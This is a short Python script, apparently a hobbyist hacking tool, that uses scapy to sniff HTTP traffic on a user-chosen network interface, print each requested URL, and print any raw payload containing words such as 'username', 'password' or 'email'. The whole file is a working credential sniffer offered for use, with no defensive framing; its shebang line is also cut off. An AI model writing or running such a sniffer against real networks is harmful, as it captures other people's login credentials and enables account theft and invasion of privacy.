#! /usr/bin/env pyth
import scapy.all as scapy
import scapy_http.http as http


def sniff(interface):
	scapy.sniff(iface = interface,store = False,prn = http_header)
def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def user(packet):
	if packet.haslayer(scapy.Raw):
		username = packet[scapy.Raw].load
		listofusername = ["username","user","login","password","pass","email"]
		for i in listofusername:
			if i in username:
				return username
def http_header(packet):
	if packet.haslayer(http.HTTPRequest):
		url  = get_url(packet)
		print(url)
		passwrd = user(packet)
		if(passwrd):
			print(passwrd)

sniff(raw_input("Interface >> "))
